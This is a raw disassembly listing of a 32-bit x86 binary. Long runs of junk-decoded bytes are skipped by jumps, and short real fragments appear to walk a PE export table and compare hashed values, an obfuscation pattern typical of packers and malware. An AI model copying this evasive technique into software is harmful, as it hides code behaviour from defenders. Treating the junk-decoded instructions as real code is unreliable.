  40f18e:	lds    esp,FWORD PTR [esi]
  40f190:	fsubrp st(4),st
  40f192:	cmp    eax,0x4ddcdaed
  40f197:	jl     0x40f1a8
  40f199:	add    ecx,DWORD PTR [esi]
  40f19b:	test   al,0x66
  40f19d:	push   cs
  40f19e:	imul   edi,DWORD PTR [ecx+ebp*1-0x61],0x182574d
  40f1a6:	addr16 sub al,0xd1
  40f1a9:	xchg   esp,eax
  40f1aa:	and    DWORD PTR [edi+0x3],0x62
  40f1ae:	hlt    
  40f1af:	sub    eax,0xe003f285
  40f1b4:	and    al,0x5
  40f1b6:	sbb    bh,BYTE PTR [eax-0x64]
  40f1b9:	pop    edx
  40f1ba:	push   esi
  40f1bb:	repz jle 0x40f1ed
  40f1be:	xor    al,al
  40f1c0:	push   ebx
  40f1c1:	inc    edx
  40f1c3:	fsubr  DWORD PTR [ebp+0x39deceaf]
  40f1c9:	inc    ebx
  40f1ca:	xor    BYTE PTR [edi-0x507f4a00],al
  40f1d0:	jg     0x40f20b
  40f1d2:	sub    ch,bh
  40f1d4:	add    al,0x98
  40f1d6:	ja     0x40f252
  40f1d8:	hlt    
  40f1d9:	ficomp DWORD PTR [bx+di+0x458b]
  40f1de:	das    
  40f1df:	adc    al,BYTE PTR [edi+ecx*4]
  40f1e2:	cmp    dh,bl
  40f1e4:	imul   ecx,DWORD PTR [eax-0x29a7538d],0x9
  40f1eb:	dec    ebx
  40f1ec:	and    edx,ebx
  40f1ee:	mov    dh,0x5a
  40f1f0:	out    0xa9,al
  40f1f2:	arpl   sp,bp
  40f1f4:	adc    ebp,DWORD PTR [ecx+edx*4]
  40f1f7:	jg     0x40f25d
  40f1f9:	mov    al,ds:0xbe88e6b4
  40f1fe:	je     0x40f20f
  40f200:	cmp    BYTE PTR [esi+0x4e],al
  40f203:	call   0xe6f27576
  40f208:	fsub   DWORD PTR [ecx]
  40f20a:	fisttp QWORD PTR [esi]
  40f20c:	frstpm(287 only) 
  40f20e:	ds add eax,0x8b4f080b
  40f214:	hlt    
  40f215:	pop    ecx
  40f216:	ja     0x40f1cf
  40f218:	enter  0x25d3,0xa
  40f21c:	ja     0x40f21e
  40f21e:	pusha  
  40f21f:	adc    ch,dh
  40f221:	push   ss
  40f222:	fbstp  TBYTE PTR [ebx-0x4ad5a00a]
  40f228:	jmp    0x85bf:0x82f16768
  40f22f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f230:	(bad)
  40f233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f234:	std    
  40f235:	jle    0x40f210
  40f237:	jl     0x40f2a1
  40f239:	fs aaa 
  40f23b:	mov    esp,0x12c1000a
  40f240:	jmp    0x331b:0xcec7ee72
  40f247:	addr16 popf 
  40f249:	jl     0x40f1f0
  40f24b:	add    DWORD PTR [edx],ebp
  40f24d:	inc    edx
  40f24e:	push   ebx
  40f24f:	seta   BYTE PTR ds:0x7fa1f1a
  40f256:	in     eax,dx
  40f257:	loopne 0x40f263
  40f259:	add    al,0x6f
  40f25c:	jne    0x40f2ce
  40f25e:	push   es
  40f25f:	cmc    
  40f260:	fimul  DWORD PTR ds:0xecffdcb8
  40f266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f267:	gs js  0x40f209
  40f26a:	(bad)  
  40f26b:	in     al,dx
  40f26c:	mov    ebx,0xbd51dade
  40f271:	aam    0x8a
  40f273:	inc    esi
  40f274:	and    DWORD PTR [edi+0x7e],0x5d
  40f278:	adc    al,0xf4
  40f27a:	enter  0xd1b1,0x33
  40f27e:	xchg   ebp,eax
  40f27f:	pop    esp
  40f280:	mov    cl,0x71
  40f282:	call   0x98464356
  40f287:	pop    esp
  40f288:	mov    edx,0x69f9e403
  40f28d:	jge    0x40f2b0
  40f28f:	and    dh,BYTE PTR ds:0xf76ddca3
  40f295:	dec    esp
  40f296:	in     eax,dx
  40f297:	add    DWORD PTR [edx],ecx
  40f299:	mov    al,0x2a
  40f29b:	(bad)  
  40f29c:	mov    dl,0x44
  40f29e:	fmul   QWORD PTR ds:0xe9a52999
  40f2a4:	pop    esi
  40f2a5:	lods   al,BYTE PTR ds:[esi]
  40f2a6:	cmp    BYTE PTR [ebx+esi*4-0x1f],bh
  40f2aa:	inc    esi
  40f2ab:	fisubr WORD PTR [eax]
  40f2ad:	sti    
  40f2ae:	push   ss
  40f2af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2b0:	cmp    eax,0x67fb6ee0
  40f2b5:	jno    0x40f269
  40f2b7:	and    eax,0xcdb7c160
  40f2bc:	or     ebp,DWORD PTR [edi+0x6374d80e]
  40f2c2:	loopne 0x40f25c
  40f2c4:	fdiv   DWORD PTR [ebx]
  40f2c6:	mov    DWORD PTR [eax],0x60341e89
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	ror    BYTE PTR [eax],1
  40f2f8:	ins    BYTE PTR es:[edi],dx
  40f2f9:	aaa    
  40f2fa:	shl    DWORD PTR [esi-0x57],0x70
  40f2fe:	jo     0x40f2c3
  40f300:	jg     0x40f372
  40f302:	jo     0x40f2ec
  40f304:	in     eax,0xb6
  40f306:	mov    al,0xd6
  40f308:	shr    DWORD PTR [edx-0x2c],1
  40f30b:	xor    DWORD PTR [ecx+0x8],edi
  40f30e:	jno    0x40f2ca
  40f310:	dec    ecx
  40f311:	fs clc 
  40f313:	scas   eax,DWORD PTR es:[edi]
  40f314:	and    eax,0x281ac371
  40f319:	dec    eax
  40f31a:	sbb    al,0x44
  40f31c:	in     eax,0xc5
  40f31e:	cli    
  40f31f:	aas    
  40f320:	adc    DWORD PTR [edx],eax
  40f322:	fisttp DWORD PTR [edi+eax*2+0x65bb120d]
  40f329:	fwait
  40f32a:	es call 0x3dd77ea
  40f330:	retf   0x308b
  40f333:	cmp    eax,0x47c7daf9
  40f338:	mov    esi,0xf6554f5c
  40f33d:	add    DWORD PTR [ecx+0x6fd69e2],ecx
  40f343:	int3   
  40f344:	cmp    ebp,DWORD PTR [esi+ecx*2]
  40f347:	cdq    
  40f348:	mov    ds:0x57946d54,al
  40f34d:	and    DWORD PTR [ebp+0x332af751],0x7696f2f8
  40f357:	mov    dh,0xb9
  40f359:	pop    edi
  40f35a:	pop    edx
  40f35b:	stos   BYTE PTR es:[edi],al
  40f35c:	mov    bl,0xa8
  40f35e:	mov    dh,0x7
  40f360:	sub    BYTE PTR [edi-0x72a8759d],al
  40f366:	cdq    
  40f367:	aaa    
  40f368:	xchg   edi,eax
  40f369:	lea    esi,[esi]
  40f36b:	push   ebp
  40f36c:	xor    eax,0xef0fd919
  40f371:	out    0x2f,al
  40f373:	push   0x5c
  40f375:	dec    ecx
  40f376:	gs add al,0x90
  40f379:	mov    edi,0x6b56f99a
  40f37e:	(bad)  
  40f37f:	in     al,0x3e
  40f381:	inc    ebx
  40f382:	mov    bh,0x2d
  40f384:	retf   
  40f385:	jle    0x40f3b4
  40f387:	mov    edi,0x44b5ff5e
  40f38c:	sti    
  40f38d:	xor    esi,DWORD PTR [edi-0x504cdade]
  40f393:	sti    
  40f394:	push   edx
  40f395:	fwait
  40f396:	imul   ebx,edi,0xff6f651e
  40f39c:	mov    WORD PTR [ecx+eiz*4-0x5b],?
  40f3a0:	jg     0x40f40d
  40f3a2:	jecxz  0x40f41a
  40f3a4:	dec    eax
  40f3a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3a6:	push   esp
  40f3a7:	(bad)  
  40f3a8:	cmp    al,0x1a
  40f3aa:	cmp    ecx,DWORD PTR [esi+0x550c27bd]
  40f3b0:	neg    BYTE PTR [esi-0x1305212b]
  40f3b6:	ja     0x40f430
  40f3b8:	pop    edi
  40f3b9:	leave  
  40f3ba:	mov    DWORD PTR ds:0x2d70ee3d,esp
  40f3c0:	sub    edi,DWORD PTR [ecx]
  40f3c2:	pop    edx
  40f3c3:	retf   
  40f3c4:	or     eax,0x475103fe
  40f3c9:	(bad)  
  40f3ca:	fbld   TBYTE PTR [edx+0x2b]
  40f3cd:	les    ebp,FWORD PTR [ecx]
  40f3cf:	adc    eax,0x30884236
  40f3d4:	data16 adc dl,BYTE PTR [ecx-0x1cfb2fa7]
  40f3db:	xor    al,0x5e
  40f3dd:	in     al,dx
  40f3de:	in     al,0x8f
  40f3e0:	les    ecx,FWORD PTR [esi]
  40f3e2:	sub    dl,BYTE PTR [esi-0x17]
  40f3e5:	and    cl,al
  40f3e7:	mov    edi,cs
  40f3e9:	outs   dx,DWORD PTR ds:[esi]
  40f3ea:	dec    esi
  40f3eb:	push   esp
  40f3ec:	popf   
  40f3ed:	xchg   esp,eax
  40f3ee:	or     dh,dh
  40f3f0:	adc    eax,0x1abdc1cf
  40f3f5:	xor    al,0x6f
  40f3f7:	call   esp
  40f3f9:	jle    0x40f416
  40f3fb:	push   ds
  40f3fc:	fadd   st,st(1)
  40f3fe:	push   ebp
  40f3ff:	clc    
  40f400:	adc    dl,BYTE PTR [ebx+0x923a3cb]
  40f406:	xchg   DWORD PTR [esi],ebx
  40f408:	pop    edi
  40f409:	inc    eax
  40f40a:	mov    esp,0xdf28d7fd
  40f40f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f410:	into   
  40f411:	xor    dl,ah
  40f413:	addr16 enter 0x9b8c,0xcb
  40f418:	in     al,dx
  40f419:	pushf  
  40f41a:	mov    ebp,0x1a2d3151
  40f41f:	or     DWORD PTR [ebx+0x443d5345],ebx
  40f425:	pushf  
  40f426:	shl    DWORD PTR [ecx],1
  40f428:	cmp    eax,0x4dea6df0
  40f42d:	ins    BYTE PTR es:[edi],dx
  40f42e:	test   DWORD PTR [eax+0x2498d370],edx
  40f434:	or     DWORD PTR [ebp+0x6b0c323e],edi
  40f43a:	daa    
  40f43b:	out    dx,al
  40f43c:	data16 sti 
  40f43e:	js     0x40f429
  40f440:	iret   
  40f441:	adc    BYTE PTR [edi-0x1d],bh
  40f444:	fldcw  WORD PTR [ecx+0x2b3df442]
  40f44a:	mov    ebx,0x9c4928db
  40f44f:	mov    bl,0x8b
  40f451:	inc    ebp
  40f452:	clc    
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	in     eax,0x31
  40f466:	inc    esp
  40f467:	into   
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	int3   
  40f471:	loope  0x40f444
  40f473:	and    DWORD PTR [ebx+0x2fc61712],0xffffffe8
  40f47a:	pop    ebp
  40f47b:	inc    eax
  40f47c:	cmp    bl,ch
  40f47e:	in     eax,dx
  40f47f:	mov    eax,ds:0x7455ee20
  40f484:	pop    edi
  40f485:	inc    ebp
  40f486:	add    al,0xaf
  40f488:	out    0x79,al
  40f48a:	clc    
  40f48b:	rcl    BYTE PTR [edx],1
  40f48d:	cmp    al,BYTE PTR [edx-0x55]
  40f490:	ins    BYTE PTR es:[edi],dx
  40f491:	mov    cl,0xda
  40f493:	mov    ebx,?
  40f495:	clc    
  40f496:	or     DWORD PTR [ecx+0x471cdf82],ebx
  40f49c:	ss leave 
  40f49e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f49f:	(bad)  [ebx]
  40f4a1:	call   FWORD PTR [edx+edi*4]
  40f4a4:	(bad)  
  40f4a5:	(bad)  
  40f4a6:	jae    0x40f42d
  40f4a8:	aas    
  40f4a9:	pop    eax
  40f4aa:	adc    eax,0x7992f0cd
  40f4af:	add    esp,ebx
  40f4b1:	inc    edx
  40f4b2:	push   esp
  40f4b3:	jae    0x40f52c
  40f4b5:	mov    ebp,0x7add8cbf
  40f4ba:	pop    edi
  40f4bb:	cmp    BYTE PTR [edi-0x3311b7e1],ah
  40f4c1:	ja     0x40f4ac
  40f4c3:	pushf  
  40f4c4:	cld    
  40f4c5:	pushf  
  40f4c6:	and    dl,ah
  40f4c8:	dec    edx
  40f4c9:	and    al,0x8
  40f4cb:	repnz push 0x13dc2c98
  40f4d1:	int3   
  40f4d2:	pop    ecx
  40f4d3:	(bad)  
  40f4d4:	fsubr  st,st(0)
  40f4d6:	mov    edx,0x1780be65
  40f4db:	or     BYTE PTR [edi],dl
  40f4dd:	cmp    ebp,esi
  40f4df:	mov    eax,0x274e636d
  40f4e4:	call   DWORD PTR [edi]
  40f4e6:	jle    0x40f548
  40f4e8:	sbb    al,0x96
  40f4ea:	cmp    al,0x43
  40f4ec:	outs   dx,BYTE PTR ds:[esi]
  40f4ed:	and    DWORD PTR [edx-0x243cffd1],ebp
  40f4f3:	fwait
  40f4f4:	and    al,cl
  40f4f6:	jl     0x40f4f0
  40f4f8:	mov    ds:0xca319895,al
  40f4fd:	leave  
  40f4fe:	sub    BYTE PTR [edx-0x29],0x59
  40f502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f503:	mov    esi,0x4f309f43
  40f508:	push   ebp
  40f509:	test   al,0x2c
  40f50b:	stos   DWORD PTR es:[edi],eax
  40f50c:	mov    ah,0xd5
  40f50e:	xchg   DWORD PTR [ecx+0x794c08d],eax
  40f514:	mov    ds:0x58eb23d8,eax
  40f519:	pop    ds
  40f51a:	fsub   QWORD PTR [ecx]
  40f51c:	out    dx,eax
  40f51d:	data16 add al,0x26
  40f520:	addr16 push ds
  40f522:	(bad)  
  40f523:	(bad)  
  40f524:	cmp    eax,0xc84948de
  40f529:	cmovae esi,DWORD PTR [edx+0x66c5f1e8]
  40f530:	imul   esi,DWORD PTR [esi],0x17bfb8cf
  40f536:	dec    ecx
  40f537:	mov    ?,WORD PTR [ebx-0x159df7c5]
  40f53d:	mov    dl,ch
  40f53f:	xor    eax,0x509b2bf8
  40f544:	or     al,BYTE PTR [edx+ecx*2]
  40f547:	repz test eax,0xefdf5423
  40f54d:	dec    esi
  40f54e:	add    eax,DWORD PTR [esp+esi*1-0x3c]
  40f552:	and    ah,BYTE PTR [edx+0x2bb01e10]
  40f558:	xchg   edi,eax
  40f559:	shl    al,cl
  40f55b:	mov    cl,0x22
  40f55d:	mov    al,ds:0x4405eb9b
  40f562:	pop    ebp
  40f563:	adc    eax,0x9524bb46
  40f568:	ins    BYTE PTR es:[edi],dx
  40f569:	mov    al,ds:0x952d2e8a
  40f56e:	fstp   st(7)
  40f570:	mov    bh,0x4f
  40f572:	push   esi
  40f573:	or     edx,DWORD PTR [ebp+0x5e]
  40f576:	inc    ecx
  40f577:	and    cl,BYTE PTR es:[edi-0x2194c517]
  40f57e:	push   edx
  40f57f:	fld    st(1)
  40f581:	push   cs
  40f582:	jmp    0x40f5eb
  40f584:	dec    edx
  40f585:	das    
  40f586:	pop    ebx
  40f587:	mov    esp,DWORD PTR [ebp+0x5d]
  40f58a:	jmp    0x328ae848
  40f58f:	jge    0x40f5d2
  40f591:	cmp    al,0xaf
  40f593:	ins    DWORD PTR es:[edi],dx
  40f594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f595:	shr    BYTE PTR [ebp+0x7f],cl
  40f598:	lea    ebx,[edx-0x17bd43e3]
  40f59e:	fimul  WORD PTR [ebx]
  40f5a0:	inc    esi
  40f5a1:	adc    eax,0x284e6a92
  40f5a6:	sub    esp,DWORD PTR [esi-0x3a99454e]
  40f5ac:	push   cs
  40f5ad:	adc    dh,bl
  40f5af:	hlt    
  40f5b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5b1:	fisub  WORD PTR [esi]
  40f5b3:	daa    
  40f5b4:	sub    al,0x4b
  40f5b6:	xlat   BYTE PTR ds:[ebx]
  40f5b7:	imul   ebp,DWORD PTR [edi],0x51
  40f5ba:	jp     0x40f5e1
  40f5bc:	push   eax
  40f5bd:	mov    eax,DWORD PTR [eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	add    al,0x36
  40f605:	mov    bl,BYTE PTR [esi-0x74]
  40f608:	mov    dh,0x70
  40f60a:	jo     0x40f5cf
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f5ef
  40f610:	mov    ebx,0x30b2198d
  40f615:	mov    al,0xe7
  40f617:	pop    edi
  40f618:	lods   eax,DWORD PTR ds:[esi]
  40f619:	(bad)  
  40f61a:	or     ecx,DWORD PTR [esi]
  40f61c:	or     eax,0xf816623b
  40f621:	loope  0x40f665
  40f623:	cmp    DWORD PTR [eax+eiz*1+0x70],esp
  40f627:	popa   
  40f628:	mov    dh,0x9c
  40f62a:	loopne 0x40f5af
  40f62c:	jp     0x40f5b1
  40f62e:	push   0x5c
  40f630:	stos   BYTE PTR es:[edi],al
  40f631:	loopne 0x40f68c
  40f633:	loop   0x40f676
  40f635:	or     bl,BYTE PTR [edx*4+0x309d9388]
  40f63c:	adc    bl,cl
  40f63e:	scas   al,BYTE PTR es:[edi]
  40f63f:	popa   
  40f640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f641:	mov    eax,0x80e0af50
  40f646:	mov    dl,0xf6
  40f648:	retf   
  40f649:	popf   
  40f64a:	es shr esi,cl
  40f64d:	add    ecx,DWORD PTR [eax-0x35]
  40f650:	cs outs dx,DWORD PTR es:[esi]
  40f653:	mov    eax,0xfae64193
  40f658:	in     al,dx
  40f659:	fild   QWORD PTR [ebx+0x2d6003a5]
  40f65f:	and    ch,BYTE PTR [ebx]
  40f661:	in     eax,dx
  40f662:	fcom   st(6)
  40f664:	aas    
  40f665:	pop    ss
  40f666:	jnp    0x40f634
  40f668:	xor    BYTE PTR [eax-0x46],0x26
  40f66c:	and    eax,0xb87d2f53
  40f671:	jne    0x40f6cd
  40f673:	and    esi,DWORD PTR gs:[ebp+0x39e23c6e]
  40f67a:	adc    DWORD PTR [ecx+0x30],ecx
  40f67d:	and    DWORD PTR [ecx],ecx
  40f67f:	fisttp QWORD PTR [ebp+0x1d]
  40f682:	imul   ecx,DWORD PTR ds:0xef96a525,0xc2562c34
  40f68c:	add    al,0xc4
  40f68e:	mov    esi,0xa4f18e00
  40f693:	loop   0x40f6d5
  40f695:	pop    edx
  40f696:	push   ss
  40f697:	aaa    
  40f698:	repnz mov ah,0x41
  40f69b:	mov    cl,0xf0
  40f69d:	sub    DWORD PTR [esi+0x204ab8a3],esp
  40f6a3:	mov    ch,0x92
  40f6a5:	sahf   
  40f6a6:	data16 outs dx,BYTE PTR ds:[esi]
  40f6a8:	mov    eax,0x2e628f52
  40f6ad:	add    DWORD PTR [edi+ebx*1+0x30],0xafbd4b52
  40f6b5:	xor    al,0xd9
  40f6b7:	cmp    DWORD PTR [edx+0x450e6553],0x7a76e1ea
  40f6c1:	ins    BYTE PTR es:[edi],dx
  40f6c2:	jae    0x40f64d
  40f6c4:	popa   
  40f6c5:	lahf   
  40f6c6:	inc    ecx
  40f6c7:	pusha  
  40f6c8:	adc    cl,BYTE PTR [edx]
  40f6ca:	out    dx,al
  40f6cb:	ins    DWORD PTR es:[edi],dx
  40f6cc:	enter  0x3307,0x32
  40f6d0:	add    BYTE PTR [ecx-0x34],bl
  40f6d3:	ret    0xaa0f
  40f6d6:	jmp    0x2cd45e19
  40f6db:	int3   
  40f6dc:	data16 loop 0x40f6f5
  40f6df:	addr16 dec edi
  40f6e1:	aas    
  40f6e2:	add    DWORD PTR [ecx],ebp
  40f6e4:	dec    esi
  40f6e5:	scas   eax,DWORD PTR es:[edi]
  40f6e6:	out    dx,al
  40f6e7:	dec    eax
  40f6e8:	jne    0x40f767
  40f6ea:	jge    0x40f707
  40f6ec:	mov    al,ds:0xc5b1d7b1
  40f6f1:	push   ecx
  40f6f2:	mov    bh,0x9c
  40f6f4:	fcom   QWORD PTR [edi-0x11]
  40f6f7:	jae    0x40f68b
  40f6f9:	cdq    
  40f6fa:	pop    esp
  40f6fb:	dec    esi
  40f6fc:	adc    eax,0x80bf5d4
  40f701:	pushf  
  40f702:	xor    al,0x15
  40f704:	ret    
  40f705:	xor    DWORD PTR [ebx+edi*4],ecx
  40f708:	pop    esi
  40f709:	mov    al,ds:0xc6250d57
  40f70e:	imul   edx,DWORD PTR [ebp+0x295e7ceb],0x2b
  40f715:	mov    esp,0x8a80150f
  40f71a:	inc    edx
  40f71b:	jg     0x40f77f
  40f71d:	push   cs
  40f71e:	sahf   
  40f71f:	and    al,0x6f
  40f721:	cmc    
  40f722:	aas    
  40f723:	jecxz  0x40f6af
  40f725:	add    DWORD PTR [edx],esp
  40f727:	loope  0x40f729
  40f729:	test   eax,0x81f91219
  40f72e:	add    DWORD PTR [edx+0x3f398289],ebx
  40f734:	jle    0x40f779
  40f736:	mov    DWORD PTR [edx+0x6f],ecx
  40f739:	repz ds ret 0x6044
  40f73e:	sbb    BYTE PTR [ebp-0x62],ch
  40f741:	mov    edx,0x4eefa6e4
  40f746:	inc    esi
  40f747:	jmp    0xf250:0x88b53b00
  40f74e:	add    ch,0x37
  40f751:	xchg   esp,eax
  40f752:	fldenv [ebx+ecx*1-0xb]
  40f756:	mov    WORD PTR [ebx*8-0x74f11990],cs
  40f75d:	inc    ebp
  40f75e:	clc    
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0xbbf146f3
  40f7e3:	inc    edx
  40f7e4:	in     al,dx
  40f7e5:	pop    edi
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f7b9
  40f7ee:	js     0x40f78f
  40f7f0:	pop    eax
  40f7f1:	xor    ebp,ebx
  40f7f3:	inc    DWORD PTR [eax]
  40f7f5:	ds stos DWORD PTR es:[edi],eax
  40f7f7:	fisubr WORD PTR [esi+0xe]
  40f7fa:	add    eax,0x1bc2be20
  40f7ff:	xchg   ebx,eax
  40f800:	fcomi  st,st(7)
  40f802:	(bad)  
  40f804:	pop    eax
  40f805:	sbb    esp,edx
  40f807:	push   cs
  40f808:	dec    eax
  40f809:	sub    BYTE PTR [edi+edi*2+0x4f893bcb],dh
  40f810:	dec    ebp
  40f811:	xlat   BYTE PTR ds:[ebx]
  40f812:	jnp    0x40f797
  40f814:	xor    eax,0x6a35bdff
  40f819:	jg     0x40f7e3
  40f81b:	mov    edx,0xd93006e2
  40f820:	xchg   ebx,eax
  40f821:	sub    BYTE PTR [edi+0x19696b1c],0x7a
  40f828:	mov    edx,ecx
  40f82a:	mov    dh,0x12
  40f82c:	jns    0x40f819
  40f82e:	sbb    esi,ebp
  40f830:	jnp    0x40f7ef
  40f832:	call   0x8543c355
  40f837:	ss cmp eax,0x99af2531
  40f83d:	jmp    0x40f7ce
  40f83f:	(bad)  
  40f840:	xor    bl,BYTE PTR [ecx]
  40f842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f843:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f845:	repz fwait
  40f847:	jmp    0x40f87e
  40f849:	test   BYTE PTR [ecx+ebp*8],0x3d
  40f84d:	adc    dl,BYTE PTR [eax]
  40f84f:	adc    al,0x66
  40f851:	pop    es
  40f852:	shr    BYTE PTR [ecx+0xa],1
  40f855:	jb     0x40f85d
  40f857:	lahf   
  40f858:	add    eax,0xd0e3dddc
  40f85d:	xchg   esi,eax
  40f85e:	pop    edi
  40f85f:	jl     0x40f834
  40f861:	dec    ecx
  40f862:	pop    ss
  40f863:	push   eax
  40f864:	push   esp
  40f865:	cmp    ch,BYTE PTR [eax+eiz*1-0x4e]
  40f869:	xchg   ecx,eax
  40f86a:	adc    BYTE PTR [edi-0x30],0x84
  40f86e:	(bad)  
  40f86f:	mov    cl,0xb4
  40f871:	xchg   ebx,eax
  40f872:	jbe    0x40f8b1
  40f874:	push   esi
  40f875:	psubsb mm0,QWORD PTR [edx]
  40f878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f879:	cmp    cl,BYTE PTR [edx+ecx*8-0xafc608a]
  40f880:	mov    edi,0xdc8fd4a5
  40f885:	mov    ebx,0x1f3be04d
  40f88a:	push   edi
  40f88b:	and    eax,DWORD PTR [edi-0xf]
  40f88e:	xor    ecx,DWORD PTR [esi+0x437a587a]
  40f894:	xchg   edi,eax
  40f895:	das    
  40f896:	or     eax,0x915eaefa
  40f89b:	out    0x56,eax
  40f89d:	dec    ebp
  40f89e:	or     ecx,DWORD PTR [esp+edi*8]
  40f8a1:	cmp    DWORD PTR [eax-0x35777517],edx
  40f8a7:	stos   DWORD PTR es:[edi],eax
  40f8a8:	and    BYTE PTR [eax-0x6b1a1a25],0x1c
  40f8af:	data16 scas al,BYTE PTR es:[edi]
  40f8b1:	mov    ebx,0x3218ac90
  40f8b6:	retf   0x2f59
  40f8b9:	inc    ebp
  40f8ba:	jo     0x40f8d4
  40f8bc:	jne    0x40f88b
  40f8be:	data16 sar cl,0xf4
  40f8c2:	inc    ebp
  40f8c3:	or     esp,DWORD PTR [esi+0x2502aed7]
  40f8c9:	mov    ch,0x51
  40f8cb:	mov    DWORD PTR [ecx],esp
  40f8cd:	popf   
  40f8ce:	dec    BYTE PTR [ebx+0x54]
  40f8d1:	out    dx,eax
  40f8d2:	jnp    0x40f8cb
  40f8d4:	lods   al,BYTE PTR ds:[esi]
  40f8d5:	add    al,0x74
  40f8d7:	jae    0x40f8fc
  40f8d9:	or     edi,edx
  40f8db:	sub    al,0x89
  40f8dd:	lods   eax,DWORD PTR ds:[esi]
  40f8de:	mov    ?,WORD PTR [eax-0x2c]
  40f8e1:	xchg   edx,eax
  40f8e2:	xchg   ecx,eax
  40f8e3:	inc    eax
  40f8e4:	jle    0x40f8e0
  40f8e6:	push   eax
  40f8e7:	loop   0x40f890
  40f8e9:	jp     0x40f87f
  40f8eb:	nop
  40f8ec:	and    DWORD PTR [ebp+eiz*8+0xfd9097a],ebx
  40f8f3:	int    0xda
  40f8f5:	(bad)  
  40f8f6:	xor    al,0xfe
  40f8f8:	push   ss
  40f8f9:	jns    0x40f88c
  40f8fb:	addr16 out 0xb1,al
  40f8fe:	dec    ebx
  40f8ff:	nop
  40f900:	add    BYTE PTR [edx],cl
  40f902:	sbb    eax,0xd0ec30cc
  40f907:	cwde   
  40f908:	aaa    
  40f909:	xor    ecx,ecx
